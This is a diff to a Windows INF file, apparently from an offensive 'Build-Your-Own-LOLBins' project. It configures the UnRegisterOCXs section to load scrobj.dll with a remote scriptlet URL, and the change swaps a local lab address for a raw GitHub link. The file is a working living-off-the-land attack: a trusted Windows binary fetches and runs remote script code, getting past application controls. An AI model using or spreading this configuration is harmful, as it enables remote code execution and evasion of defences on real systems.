@@ -6,7 +6,7 @@ AdvancedINF=2.5
 UnRegisterOCXs=UnRegisterOCXSection
 
 [UnRegisterOCXSection]
-%11%\scrobj.dll,NI,http://192.168.56.1:8000/sct/byol.sct
+%11%\scrobj.dll,NI,https://raw.githubusercontent.com/WesleyWong420/Build-Your-Own-LOLBins/main/base/src/sct/byol.sct
 
 [Strings]
 AppAct = "SOFTWARE\Microsoft\Connection Manager"
